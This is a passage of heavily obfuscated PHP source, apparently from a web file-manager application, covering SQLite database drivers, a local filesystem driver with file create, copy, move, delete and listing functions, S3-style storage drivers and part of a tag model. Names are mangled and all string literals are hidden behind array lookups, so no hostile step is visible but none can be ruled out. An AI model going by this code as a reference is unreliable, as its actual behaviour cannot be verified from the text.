$²ÀÒšà . $­ôçµº´[4] . sqlite_error_string($²ÀÒšà); if ($­ôçµº´[12] != $this->queryStr) { $this->error .= LNG($­ôçµº´[48]) . $this->queryStr; } think_trace($this->error, $­ôçµº´[12], $­ôçµº´[49]); return $this->error; } public function escapeString($ˆÕâÛ›Í) { return sqlite_escape_string($ˆÕâÛ›Í); } public function parseLimit($«³–¦Â) { $ÍõÁÇ§Ê =& $_SERVER[íïàËŸë]; $é”í­äÌ = $ÍõÁÇ§Ê[12]; if (!empty($«³–¦Â)) { $«³–¦Â = explode($ÍõÁÇ§Ê[50], $«³–¦Â); if (count($«³–¦Â) > 1) { $é”í­äÌ .= $ÍõÁÇ§Ê[51] . $«³–¦Â[1] . $ÍõÁÇ§Ê[52] . $«³–¦Â[0] . $ÍõÁÇ§Ê[53]; } else { $é”í­äÌ .= $ÍõÁÇ§Ê[51] . $«³–¦Â[0] . $ÍõÁÇ§Ê[53]; } } return $é”í­äÌ; } } class DbSqlite3Base extends Db { public function __construct($êÍÃ  ‰ = '') { $ä™Ã³¸Ó =& $_SERVER[íïàËŸë]; if (!class_exists($ä™Ã³¸Ó[54])) { think_exception(think_lang($ä™Ã³¸Ó[14]) . $ä™Ã³¸Ó[55]); } if (!empty($êÍÃ  ‰)) { if (!isset($êÍÃ  ‰[$ä™Ã³¸Ó[16]])) { $êÍÃ  ‰[$ä™Ã³¸Ó[16]] = 438; } $this->config = $êÍÃ  ‰; if (empty($this->config[$ä™Ã³¸Ó[17]])) { $this->config[$ä™Ã³¸Ó[17]] = array(); } } } public function connect($ò…Ò¸èï = '', $ÔáíÈøß = 0) { $Ë¬Ù’ïœ =& $_SERVER[íïàËŸë]; if (!isset($this->linkID[$ÔáíÈøß])) { if (empty($ò…Ò¸èï)) { $ò…Ò¸èï = $this->config; } $this->linkID[$ÔáíÈøß] = new SQLite3($ò…Ò¸èï[$Ë¬Ù’ïœ[21]]); if (!$this->linkID[$ÔáíÈøß]) { think_exception($this->linkID[$ÔáíÈøß]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$ÔáíÈøß]->busyTimeout(30000); if (1 != think_config($Ë¬Ù’ïœ[22])) { unset($this->config); } } return $this->linkID[$ÔáíÈøß]; } public function free() { $this->queryID = null; } public function query($†õÊ¤¹¨) { $üÔ÷æ­ =& $_SERVER[íïàËŸë]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $†õÊ¤¹¨; if ($this->queryID) { $this->free(); } think_action_status($üÔ÷æ­[23], 1); think_status($üÔ÷æ­[24]); $this->queryID = $this->_linkID->query($†õÊ¤¹¨); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $¹ñ½æÓ— = $this->getAll(); $this->numRows = count($¹ñ½æÓ—); return $¹ñ½æÓ—; } } public function execute($’Éœ±“¿) { $çÕÓëŠ» =& $_SERVER[íïàËŸë]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $’Éœ±“¿; if ($this->queryID) { $this->free(); } think_action_status($çÕÓëŠ»[25], 1); think_status($çÕÓëŠ»[24]); $Üôø¼€³ = $this->_linkID->exec($’Éœ±“¿); $this->debug(); if (!1 === $Üôø¼€³) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[íïàËŸë][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ƒÉßá = $this->_linkID->query($_SERVER[íïàËŸë][27]); if (!$ƒÉßá) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÍíãÃÓ§ = $this->_linkID->query($_SERVER[íïàËŸë][28]); if (!$ÍíãÃÓ§) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $™ìù³ä¤ = array(); while ($ÉãÕô­Ä = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $™ìù³ä¤[] = $ÉãÕô­Ä; } $this->queryID->reset(); return $™ìù³ä¤; } public function getFields($¦Ûıƒ¡õ) { $œØÓÂÊ¾ =& $_SERVER[íïàËŸë]; $‹£®Ÿ = $this->query($œØÓÂÊ¾[29] . $¦Ûıƒ¡õ . $œØÓÂÊ¾[30]); $ú¸’”İ¬ = array(); if ($‹£®Ÿ) { foreach ($‹£®Ÿ as $è½²¿š× => $ÚÉ–¥ÖŠ) { $ú¸’”İ¬[$ÚÉ–¥ÖŠ[$œØÓÂÊ¾[32]]] = array($œØÓÂÊ¾[32] => $ÚÉ–¥ÖŠ[$œØÓÂÊ¾[32]], $œØÓÂÊ¾[33] => $ÚÉ–¥ÖŠ[$œØÓÂÊ¾[33]], $œØÓÂÊ¾[35] => (bool) ($ÚÉ–¥ÖŠ[$œØÓÂÊ¾[35]] === $œØÓÂÊ¾[12]), $œØÓÂÊ¾[37] => $ÚÉ–¥ÖŠ[$œØÓÂÊ¾[56]], $œØÓÂÊ¾[39] => (bool) $ÚÉ–¥ÖŠ[$œØÓÂÊ¾[57]], $œØÓÂÊ¾[42] => (bool) $ÚÉ–¥ÖŠ[$œØÓÂÊ¾[57]]); } } return $ú¸’”İ¬; } public function getTables($ú¾¼©­Â = '') { $‹•‡µï =& $_SERVER[íïàËŸë]; $¿åúÏ¤Ù = $this->query($‹•‡µï[45] . $‹•‡µï[46] . $‹•‡µï[47]); $÷³…ÍÍ¹ = array(); foreach ($¿åúÏ¤Ù as $­øÑÎĞ£ => $ÃÆëï¡²) { $÷³…ÍÍ¹[$­øÑÎĞ£] = current($ÃÆëï¡²); } return $÷³…ÍÍ¹; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $¾§êµÜª =& $_SERVER[íïàËŸë]; $this->error = $this->_linkID->lastErrorMsg(); if ($¾§êµÜª[12] != $this->queryStr) { $this->error .= LNG($¾§êµÜª[48]) . $this->queryStr; } think_trace($this->error, $¾§êµÜª[12], $¾§êµÜª[49]); return $this->error; } public function escapeString($ÊÆÎÇ†) { $»ìÛÏÌ =& $_SERVER[íïàËŸë]; if ($this->_linkID) { return $this->_linkID->escapeString($ÊÆÎÇ†); } return str_ireplace($»ìÛÏÌ[58], $»ìÛÏÌ[59], $ÊÆÎÇ†); } public function parseLimit($ßÖˆÇÉô) { $ÃìÔ•ùÛ =& $_SERVER[íïàËŸë]; $Âİ›€éî = $ÃìÔ•ùÛ[12]; if (!empty($ßÖˆÇÉô)) { $ßÖˆÇÉô = explode($ÃìÔ•ùÛ[50], $ßÖˆÇÉô); if (count($ßÖˆÇÉô) > 1) { $Âİ›€éî .= $ÃìÔ•ùÛ[51] . $ßÖˆÇÉô[1] . $ÃìÔ•ùÛ[52] . $ßÖˆÇÉô[0] . $ÃìÔ•ùÛ[53]; } else { $Âİ›€éî .= $ÃìÔ•ùÛ[51] . $ßÖˆÇÉô[0] . $ÃìÔ•ùÛ[53]; } } return $Âİ›€éî; } } goto cÇ»Ç±¼«Ö; B×‘ä…Ü÷: class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($ç­âŸ–î) { if (substr($ç­âŸ–î, 0, 2) == $_SERVER[íïàËŸë][1449]) { $ç­âŸ–î = BASIC_PATH . substr($ç­âŸ–î, 2); } return $ç­âŸ–î; } public function iconvApp($ÆòÔü£) { $ïî©‹éƒ =& $_SERVER[íïàËŸë]; global $config; return $this->iconvTo($ÆòÔü£, $config[$ïî©‹éƒ[1447]], $config[$ïî©‹éƒ[1446]]); } public function iconvSystem($³¸ƒÏ¥¯) { $ÓÃ‰”‰á =& $_SERVER[íïàËŸë]; global $config; return $this->iconvTo($³¸ƒÏ¥¯, $config[$ÓÃ‰”‰á[1446]], $config[$ÓÃ‰”‰á[1447]]); } public function getPathOuter($óíëÆ›Š) { $‚…•ò÷‹ =& $_SERVER[íïàËŸë]; $ó§”†¼ƒ = $this->iconvApp($this->pathBase); $óíëÆ›Š = $this->iconvApp($óíëÆ›Š); if (substr($ó§”†¼ƒ, 0, 2) == $‚…•ò÷‹[1449]) { $ó§”†¼ƒ = BASIC_PATH . substr($ó§”†¼ƒ, 2); } if (substr($óíëÆ›Š, 0, 2) == $‚…•ò÷‹[1449]) { $óíëÆ›Š = BASIC_PATH . substr($óíëÆ›Š, 2); } $ó§”†¼ƒ = KodIO::clear($ó§”†¼ƒ); $óíëÆ›Š = KodIO::clear($óíëÆ›Š); $óíëÆ›Š = substr($óíëÆ›Š, strlen($ó§”†¼ƒ)); if (empty($this->pathDriver)) { return $óíëÆ›Š; } return $this->pathDriver . $‚…•ò÷‹[8] . ltrim($óíëÆ›Š, $‚…•ò÷‹[8]); } public function mkfile($˜¹Âú», $äé¸Í…¾ = '', $íŠ°ª¼à = REPEAT_RENAME) { $˜¹Âú» = $this->iconvSystem($˜¹Âú»); @touch($˜¹Âú»); if ($äé¸Í…¾) { file_put_contents($˜¹Âú», $äé¸Í…¾); } @chmod($˜¹Âú», $this->pathAuth); if (is_file($˜¹Âú»)) { return $this->getPathOuter($˜¹Âú»); } $this->writeLog(__FUNCTION__ . $_SERVER[íïàËŸë][1459], !0); return !1; } public function mkdir($‹ˆ§ù, $’ÍÊòÔ = REPEAT_SKIP) { $‹ˆ§ù = $this->iconvSystem($‹ˆ§ù); if (is_dir($‹ˆ§ù)) { return $this->getPathOuter($‹ˆ§ù); } if (!$this->mkdir($this->pathFather($‹ˆ§ù))) { return !1; } @mkdir($‹ˆ§ù, $this->pathAuth, !0); @chmod($‹ˆ§ù, $this->pathAuth); if (is_dir($‹ˆ§ù)) { return $this->getPathOuter($‹ˆ§ù); } $this->writeLog(__FUNCTION__ . $_SERVER[íïàËŸë][1459], !0); return !1; } public function copyFile($¬­ÒİÆ, $È™ŞêùŸ) { $this->mkdir($this->pathFather($È™ŞêùŸ)); $¬­ÒİÆ = $this->iconvSystem($¬­ÒİÆ); $È™ŞêùŸ = $this->iconvSystem($È™ŞêùŸ); $³Âşõ” = copy_64($¬­ÒİÆ, $È™ŞêùŸ); @chmod($È™ŞêùŸ, $this->pathAuth); if ($³Âşõ”) { return $this->getPathOuter($È™ŞêùŸ); } $this->writeLog(__FUNCTION__ . $_SERVER[íïàËŸë][1459], !0); return !1; } public function moveFile($ášÀ‡º, $ ºĞÀé») { $this->mkdir($this->pathFather($ ºĞÀé»)); $ášÀ‡º = $this->iconvSystem($ášÀ‡º); $ ºĞÀé» = $this->iconvSystem($ ºĞÀé»); $Š˜ãùó§ = intval(@rename($ášÀ‡º, $ ºĞÀé»)); if (!$Š˜ãùó§) { if ($Š˜ãùó§ = intval(@copy_64($ášÀ‡º, $ ºĞÀé»))) { @unlink($ášÀ‡º); } } @chmod($ ºĞÀé», $this->pathAuth); if ($Š˜ãùó§) { return $this->getPathOuter($ ºĞÀé»); } $this->writeLog(__FUNCTION__ . $_SERVER[íïàËŸë][1459], !0); return !1; } public function movePath($üÜŠ¼ı¨, $·Ã±¾‘, $‚‘Ùê­ = false) { $­®ÓÛ×Ã =& $_SERVER[íïàËŸë]; $üÜŠ¼ı¨ = $this->iconvSystem($üÜŠ¼ı¨); $·Ã±¾‘ = $this->iconvSystem($·Ã±¾‘); $ßé„“Éó = rtrim($·Ã±¾‘, $­®ÓÛ×Ã[8]) . $­®ÓÛ×Ã[8] . ($‚‘Ùê­ ? $‚‘Ùê­ : get_path_this($üÜŠ¼ı¨)); if (file_exists($ßé„“Éó)) { return !1; } $÷ü„õöÃ = intval(@rename($üÜŠ¼ı¨, $ßé„“Éó)); $÷ü„õöÃ = file_exists($ßé„“Éó); if ($÷ü„õöÃ) { return $this->getPathOuter($ßé„“Éó); } $this->writeLog(__FUNCTION__ . $­®ÓÛ×Ã[1459], !0); return !1; } public function delFile($³üëœç‰) { $³üëœç‰ = $this->iconvSystem($³üëœç‰); if (!@unlink($³üëœç‰)) { @chmod($³üëœç‰, $this->pathAuth); if (@unlink($³üëœç‰)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[íïàËŸë][1459], !0); return !1; } return !0; } public function delFolder($¹Ì´„×‘) { $ÜÀşÙ›² =& $_SERVER[íïàËŸë]; $¹Ì´„×‘ = $this->iconvSystem($¹Ì´„×‘); if (!is_dir($¹Ì´„×‘)) { return !0; } if (!($–“±³€ = opendir($¹Ì´„×‘))) { return !1; } while (($©À‡°Ï = readdir($–“±³€)) !== !1) { if ($©À‡°Ï == $ÜÀşÙ›²[10] || $©À‡°Ï == $ÜÀşÙ›²[1374]) { continue; } $²§Æ†İÒ = $¹Ì´„×‘ . $ÜÀşÙ›²[8] . $©À‡°Ï; if (is_file($²§Æ†İÒ) || is_link($²§Æ†İÒ)) { if (!unlink($²§Æ†İÒ)) { chmod($²§Æ†İÒ, $this->pathAuth); if (!unlink($²§Æ†İÒ)) { return !1; } } } else { if (is_dir($²§Æ†İÒ)) { chmod($²§Æ†İÒ, $this->pathAuth); $²§Æ†İÒ = $this->iconvApp($²§Æ†İÒ); if (!$this->delFolder($²§Æ†İÒ)) { return !1; } } } } closedir($–“±³€); return rmdir($¹Ì´„×‘); } public function rename($µ„îá×, $œÈŸÃÇ©) { $ıÓ¿îº÷ =& $_SERVER[íïàËŸë]; $ê÷ä¨‚ = $this->fileNameAuto($this->pathFather($µ„îá×), $œÈŸÃÇ©); $ê÷ä¨‚ = $this->iconvSystem($ê÷ä¨‚); $µ„îá× = $this->iconvSystem($µ„îá×); $Ş€ÓÕÇ = $this->pathFather($µ„îá×); $ƒŒ÷ ¥Á = rtrim($Ş€ÓÕÇ, $ıÓ¿îº÷[8]) . $ıÓ¿îº÷[8] . $ê÷ä¨‚; $î‘åÌÁ = @rename($µ„îá×, $ƒŒ÷ ¥Á); $ƒŒ÷ ¥Á = $this->iconvApp($ƒŒ÷ ¥Á); if ($î‘åÌÁ) { return $this->getPathOuter($ƒŒ÷ ¥Á); } $this->writeLog(__FUNCTION__ . $ıÓ¿îº÷[1459], !0); return !1; } public function size($°ú×ÅÛÀ) { $°ú×ÅÛÀ = $this->iconvSystem($°ú×ÅÛÀ); return filesize_64($°ú×ÅÛÀ); } public function info($‘‹ƒˆÔ) { $‘‹ƒˆÔ = $this->iconvSystem($‘‹ƒˆÔ); if ($this->isFolder($‘‹ƒˆÔ)) { return $this->folderInfo($‘‹ƒˆÔ); } else { if ($this->isFile($‘‹ƒˆÔ)) { return $this->fileInfo($‘‹ƒˆÔ); } } return !1; } protected function infoChildren($üÔ…èÏ´, &$áÆÃåÓ, $Ù£éÆ•¥ = true) { $¼–è™ÈŒ =& $_SERVER[íïàËŸë]; check_abort_echo(); $üÔ…èÏ´ = rtrim($üÔ…èÏ´, $¼–è™ÈŒ[8]) . $¼–è™ÈŒ[8]; if ($Ù£éÆ•¥) { $üÔ…èÏ´ = $this->iconvSystem($üÔ…èÏ´); } if (!($ÃÈØÑĞÚ = @opendir($üÔ…èÏ´))) { return; } while (($ÛÎÔÉ¢  = readdir($ÃÈØÑĞÚ)) !== !1) { if ($ÛÎÔÉ¢  == $¼–è™ÈŒ[10] || $ÛÎÔÉ¢  == $¼–è™ÈŒ[1374]) { continue; } $‰Ï—öŸ´ = $üÔ…èÏ´ . $ÛÎÔÉ¢ ; if (is_file($‰Ï—öŸ´) || is_link($‰Ï—öŸ´)) { $áÆÃåÓ[$¼–è™ÈŒ[80]]++; $áÆÃåÓ[$¼–è™ÈŒ[79]] += filesize_64($‰Ï—öŸ´); } else { if (is_dir($‰Ï—öŸ´)) { $áÆÃåÓ[$¼–è™ÈŒ[81]]++; $this->infoChildren($‰Ï—öŸ´, $áÆÃåÓ, !1); } } } closedir($ÃÈØÑĞÚ); } private function folderInfo($ÜŞğÒÜ…, $Ä«“¸¥î = false) { $„ÊšÏ® =& $_SERVER[íïàËŸë]; $ÜŞğÒÜ… = rtrim($ÜŞğÒÜ…, $„ÊšÏ®[8]) . $„ÊšÏ®[8]; $¯­÷§©î = $this->iconvApp($this->pathThis($ÜŞğÒÜ…)); if ($Ä«“¸¥î) { return array($„ÊšÏ®[32] => $¯­÷§©î, $„ÊšÏ®[87] => $this->getPathOuter($ÜŞğÒÜ…), $„ÊšÏ®[33] => $„ÊšÏ®[78]); } $³¨Ò®é = array($„ÊšÏ®[32] => $¯­÷§©î, $„ÊšÏ®[87] => $this->getPathOuter($ÜŞğÒÜ…), $„ÊšÏ®[33] => $„ÊšÏ®[78], $„ÊšÏ®[231] => @filectime($ÜŞğÒÜ…), $„ÊšÏ®[88] => @filemtime($ÜŞğÒÜ…), $„ÊšÏ®[1463] => @fileatime($ÜŞğÒÜ…), $„ÊšÏ®[1464] => is_readable($ÜŞğÒÜ…), $„ÊšÏ®[1465] => is_writable($ÜŞğÒÜ…), $„ÊšÏ®[1466] => get_mode($ÜŞğÒÜ…)); return $³¨Ò®é; } private function fileInfo($Ô‡‚Æ×Œ, $‹èÄæĞ˜ = false) { $óÒ…Ó±ü =& $_SERVER[íïàËŸë]; $µ–ü™ = $this->iconvApp($this->pathThis($Ô‡‚Æ×Œ)); if ($‹èÄæĞ˜) { return array($óÒ…Ó±ü[32] => $µ–ü™, $óÒ…Ó±ü[87] => $this->getPathOuter($Ô‡‚Æ×Œ), $óÒ…Ó±ü[33] => $óÒ…Ó±ü[230], $óÒ…Ó±ü[79] => $this->size($Ô‡‚Æ×Œ), $óÒ…Ó±ü[169] => $this->ext($µ–ü™)); } $µÅäö¯ = array($óÒ…Ó±ü[32] => $µ–ü™, $óÒ…Ó±ü[87] => $this->getPathOuter($Ô‡‚Æ×Œ), $óÒ…Ó±ü[33] => $óÒ…Ó±ü[230], $óÒ…Ó±ü[231] => @filectime($Ô‡‚Æ×Œ), $óÒ…Ó±ü[88] => @filemtime($Ô‡‚Æ×Œ), $óÒ…Ó±ü[1463] => @fileatime($Ô‡‚Æ×Œ), $óÒ…Ó±ü[79] => $this->size($Ô‡‚Æ×Œ), $óÒ…Ó±ü[169] => $this->ext($µ–ü™), $óÒ…Ó±ü[1464] => is_readable($Ô‡‚Æ×Œ), $óÒ…Ó±ü[1465] => is_writable($Ô‡‚Æ×Œ), $óÒ…Ó±ü[1466] => get_mode($Ô‡‚Æ×Œ)); return $µÅäö¯; } public function exist($ØĞŞ„ºª) { $ØĞŞ„ºª = $this->iconvSystem($ØĞŞ„ºª); return @file_exists($ØĞŞ„ºª); } public function isFile($¨‹–æ¤æ) { $¨‹–æ¤æ = $this->iconvSystem($¨‹–æ¤æ); return @is_file($¨‹–æ¤æ); } public function isFolder($‹›Ó¶Óà) { $‹›Ó¶Óà = $this->iconvSystem($‹›Ó¶Óà); return @is_dir($‹›Ó¶Óà); } public function listPath($Æô÷ÚÉ›, $Ÿ«”ş·ë = false) { $ûñâ× ü =& $_SERVER[íïàËŸë]; $Æô÷ÚÉ› = $this->iconvSystem($Æô÷ÚÉ›); $Æô÷ÚÉ› = rtrim($Æô÷ÚÉ›, $ûñâ× ü[8]) . $ûñâ× ü[8]; $æöÍõ†± = array($ûñâ× ü[85] => array(), $ûñâ× ü[86] => array()); if (!($ŠûÇÃã¢ = @opendir($Æô÷ÚÉ›))) { return $æöÍõ†±; } while (($Ôçö»•İ = readdir($ŠûÇÃã¢)) !== !1) { if ($Ôçö»•İ == $ûñâ× ü[10] || $Ôçö»•İ == $ûñâ× ü[1374]) { continue; } $µ§İ¡Œ’ = $Æô÷ÚÉ› . $Ôçö»•İ; if (is_file($µ§İ¡Œ’)) { $æöÍõ†±[$ûñâ× ü[86]][] = $this->fileInfo($µ§İ¡Œ’, $Ÿ«”ş·ë); } else { $æöÍõ†±[$ûñâ× ü[85]][] = $this->folderInfo($µ§İ¡Œ’, $Ÿ«”ş·ë); } } closedir($ŠûÇÃã¢); return $æöÍõ†±; } public function listAll($ø¯ö¥óÁ, &$Êá´³¼ = array()) { $÷Àåñ =& $_SERVER[íïàËŸë]; $ø¯ö¥óÁ = $this->iconvSystem($ø¯ö¥óÁ); $ø¯ö¥óÁ = rtrim($ø¯ö¥óÁ, $÷Àåñ[8]) . $÷Àåñ[8]; if (!($õ¡¡æ˜Ú = @opendir($ø¯ö¥óÁ))) { return $Êá´³¼; } while (($÷éó¦¡« = readdir($õ¡¡æ˜Ú)) !== !1) { if ($÷éó¦¡« == $÷Àåñ[10] || $÷éó¦¡« == $÷Àåñ[1374]) { continue; } $¬äÛá…ù = $ø¯ö¥óÁ . $÷éó¦¡«; $ÍõÄùè× = is_dir($¬äÛá…ù) && !is_link($¬äÛá…ù) ? 1 : 0; $¬äÛá…ù = $ÍõÄùè× ? $¬äÛá…ù . $÷Àåñ[8] : $¬äÛá…ù; $Êá´³¼[] = array($÷Àåñ[87] => $¬äÛá…ù, $÷Àåñ[78] => $ÍõÄùè×, $÷Àåñ[88] => intval(@filemtime($¬äÛá…ù)), $÷Àåñ[79] => $ÍõÄùè× ? 0 : intval($this->size($¬äÛá…ù))); if ($ÍõÄùè×) { $this->listAll($¬äÛá…ù, $Êá´³¼); } } closedir($õ¡¡æ˜Ú); return $Êá´³¼; } public function has($­ÁÔ‡í, $œçµœ…Ã = false, $ï—‰˜¡ = true) { $Í••ˆØ• =& $_SERVER[íïàËŸë]; $­ÁÔ‡í = $this->iconvSystem($­ÁÔ‡í); $­ÁÔ‡í = rtrim($­ÁÔ‡í, $Í••ˆØ•[8]) . $Í••ˆØ•[8]; if (!($‡’Íô¥ = @opendir($­ÁÔ‡í))) { return !1; } $÷óªœ­ = 0; $Íïåïòå = 0; $ƒ€ Ø¶İ = 0; while (($Ğêß€Òª = readdir($‡’Íô¥)) !== !1) { if ($Ğêß€Òª == $Í••ˆØ•[10] || $Ğêß€Òª == $Í••ˆØ•[1374]) { continue; } $Ÿ­Ê›Ÿ = $­ÁÔ‡í . $Ğêß€Òª; if ($œçµœ…Ã) { $ƒ€ Ø¶İ++; if (@is_file($Ÿ­Ê›Ÿ)) { $÷óªœ­++; } else { $Íïåïòå++; } if ($ƒ€ Ø¶İ > 10000) { break; } continue; } if ($ï—‰˜¡) { if (@is_file($Ÿ­Ê›Ÿ)) { return !0; } } else { if (@is_dir($Ÿ­Ê›Ÿ . $Í••ˆØ•[8])) { return !0; } } } closedir($‡’Íô¥); if ($œçµœ…Ã) { return array($Í••ˆØ•[239] => $÷óªœ­, $Í••ˆØ•[240] => $Íïåïòå); } return !1; } public function hashSimple($»õË–¾) { $Á…êõõ =& $_SERVER[íïàËŸë]; if (!$»õË–¾) { return md5($Á…êõõ[12]); } $»õË–¾ = $this->iconvSystem($»õË–¾); $¡³ëÌÜ† = $this->size($»õË–¾); $û›«á„‚ = 200; $Ôü·â¶İ = 50; if ($¡³ëÌÜ† <= $û›«á„‚ * $Ôü·â¶İ) { return $this->hashMd5($»õË–¾) . $¡³ëÌÜ†; } $Õ¢Šøº = $Á…êõõ[12]; $À×Òö¸ú = intval($¡³ëÌÜ† / $Ôü·â¶İ); $Óâ»åáè = fopen($»õË–¾, $Á…êõõ[1467]); if (!$Óâ»åáè) { return $Õ¢Šøº; } for ($ìû Ñ±Ä = 0; $ìû Ñ±Ä < $Ôü·â¶İ; $ìû Ñ±Ä++) { fseek_64($Óâ»åáè, $À×Òö¸ú * $ìû Ñ±Ä); $Õ¢Šøº .= fread($Óâ»åáè, $û›«á„‚); } fseek_64($Óâ»åáè, $¡³ëÌÜ† - $û›«á„‚); $Õ¢Šøº .= fread($Óâ»åáè, $û›«á„‚); fclose($Óâ»åáè); return md5($Õ¢Šøº) . $¡³ëÌÜ†; } public function getContent($ÂÍÖ˜Ûü) { $ÂÍÖ˜Ûü = $this->iconvSystem($ÂÍÖ˜Ûü); return file_get_contents($ÂÍÖ˜Ûü); } public function setContent($¢®ÁóÈ, $¯ä•â„ = '') { $¢®ÁóÈ = $this->iconvSystem($¢®ÁóÈ); $œëÊü = @file_put_contents($¢®ÁóÈ, $¯ä•â„, LOCK_EX); if (!$œëÊü) { $this->writeLog(__FUNCTION__ . $_SERVER[íïàËŸë][1459], !0); } clearstatcache(); @chmod($¢®ÁóÈ, $this->pathAuth); return $œëÊü === !1 ? !1 : !0; } public function fileSubstr($Õ¤ò›º¡, $¹¼ù‚§’ = 0, $ˆÎ«±³ù = false) { $ÆËÔ•ú™ =& $_SERVER[íïàËŸë]; $Õ¤ò›º¡ = $this->iconvSystem($Õ¤ò›º¡); if ($ˆÎ«±³ù === !1) { $ˆÎ«±³ù = $this->size($Õ¤ò›º¡); } if ($ˆÎ«±³ù <= 0) { return $ÆËÔ•ú™[12]; } $ Ü‚Œ• = fopen($Õ¤ò›º¡, $ÆËÔ•ú™[1467]); if (!$ Ü‚Œ•) { return !1; } fseek_64($ Ü‚Œ•, $¹¼ù‚§’); $êÖÆ—…‘ = fread($ Ü‚Œ•, $ˆÎ«±³ù); fclose($ Ü‚Œ•); if (!$êÖÆ—…‘) { $this->writeLog(__FUNCTION__ . $ÆËÔ•ú™[1459], !0); } return $êÖÆ—…‘; } public function upload($¾‰§ãèŞ, $ŞçêØíŠ, $óıÒìû = false, $ÆæÃÓŞø = REPEAT_REPLACE) { if ($óıÒìû) { return $this->moveFile($ŞçêØíŠ, $¾‰§ãèŞ); } return $this->copyFile($ŞçêØíŠ, $¾‰§ãèŞ); } public function setModifyTime($âÒÛõ÷†, $‡ûúíÕ = '') { @touch($âÒÛõ÷†, intval($‡ûúíÕ)); } public function download($‹ÇÏáÆ, $Ò¨õ±»«) { return $this->iconvSystem($‹ÇÏáÆ); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($ÊÔ”àÉö) { parent::__construct($ÊÔ”àÉö); $this->setSignVersion($_SERVER[íïàËŸë][247]); } public function fileOutImage($¨¾ÂØÔ½, $¾ˆ™ïûÑ = 250) { $©Õ“¨å† =& $_SERVER[íïàËŸë]; if ($this->size($¨¾ÂØÔ½) > 1024 * 1024 * 25) { return $this->fileOutImageServer($¨¾ÂØÔ½, $¾ˆ™ïûÑ); } $³ïÊ¾é¸ = array($©Õ“¨å†[1468] => $©Õ“¨å†[1469] . $¾ˆ™ïûÑ . $©Õ“¨å†[1470]); $Ùİ¿º = $this->link($¨¾ÂØÔ½, $³ïÊ¾é¸); $this->fileOutLink($Ùİ¿º); } public function fileOutLink($±óéßê) { $úşÒôŠÀ =& $_SERVER[íïàËŸë]; if (substr($±óéßê, 0, 7) == $úşÒôŠÀ[313]) { $±óéßê = $úşÒôŠÀ[314] . substr($±óéßê, 7); } header($úşÒôŠÀ[175] . $±óéßê); die; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($×Û‚Ì¢) { parent::__construct($×Û‚Ì¢); $this->setSignVersion($_SERVER[íïàËŸë][247]); } public function fileOutLink($´»ÓÄš”) { $ÁäÛæ¥ƒ =& $_SERVER[íïàËŸë]; if (substr($´»ÓÄš”, 0, 7) == $ÁäÛæ¥ƒ[313]) { $´»ÓÄš” = $ÁäÛæ¥ƒ[314] . substr($´»ÓÄš”, 7); } header($ÁäÛæ¥ƒ[175] . $´»ÓÄš”); die; } } goto EÂÏœ…“†•; fÄŸŠ»¯½: class GroupTagModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\137\x66\141\x76"; protected function cacheFunctionAlias($»Õš¶”ñ) { $Ë¾´¦ˆ‹ =& $_SERVER[íïàËŸë]; return array($Ë¾´¦ˆ‹[2093] => array($»Õš¶”ñ[0], $Ë¾´¦ˆ‹[2094]), $Ë¾´¦ˆ‹[2095] => array($»Õš¶”ñ[0], $Ë¾´¦ˆ‹[2096])); } protected function get($èÉªü‰°) { $ßÉ¼ô÷Ş =& $_SERVER[íïàËŸë]; $éòÑûÆ× = Model($ßÉ¼ô÷Ş[585])->metaGet($èÉªü‰°, $ßÉ¼ô÷Ş[2097]); $…äÖÏäÆ = json_decode($éòÑûÆ×, !0); return $…äÖÏäÆ ? $…äÖÏäÆ : array($ßÉ¼ô÷Ş[2098] => $ßÉ¼ô÷Ş[91], $ßÉ¼ô÷Ş[445] => array()); } protected function set($Üı©È¹£, $ Ä†Åôè) { $óÏÂ²Õå =& $_SERVER[íïàËŸë]; $ Ä†Åôè = $ Ä†Åôè ? $ Ä†Åôè : array($óÏÂ²Õå[2098] => $óÏÂ²Õå[91], $óÏÂ²Õå[445] => array()); return Model($óÏÂ²Õå[585])->metaSet($Üı©È¹£, $óÏÂ²Õå[2097], json_encode($ Ä†Åôè)); } protected function getByTagID($ğÍÇƒÏ‚, $œÏ§·¢ö) { $ÎŒø­†­ =& $_SERVER[íïàËŸë]; if (!$ğÍÇƒÏ‚ || !$œÏ§·¢ö) { return !1; } if (!Model($ÎŒø­†­[585])->getInfoSimple($ğÍÇƒÏ‚)) { return !1; } $¤¥÷öé– = $this->get($ğÍÇƒÏ‚); if (!$¤¥÷öé– || !isset($¤¥÷öé–[$ÎŒø­†­[445]])) { return !1; } $ÜØÄŠÁú = array_find_by_field($¤¥÷öé–[$ÎŒø­†­[445]], $ÎŒø­†­[475], $œÏ§·¢ö); return is_array($ÜØÄŠÁú) ? $ÜØÄŠÁú : !1; } public function listSource($»ÃÍû¢Ã, $ãÌÁõ½–) { $ô¹œºáõ =& $_SERVER[íïàËŸë]; if ($ãÌÁõ½– && !is_array($ãÌÁõ½–)) { $ãÌÁõ½– = array($ãÌÁõ½–); } $¿ä½ƒóÌ = $this->listData($»ÃÍû¢Ã); $µÚ•Ôƒ = array(); foreach ($¿ä½ƒóÌ as $æ½½¾òª) { $Û™¼ğğÓ = $æ½½¾òª[$ô¹œºáõ[87]]; if (!$Û™¼ğğÓ) { continue; } if (!isset($µÚ•Ôƒ[$Û™¼ğğÓ])) { 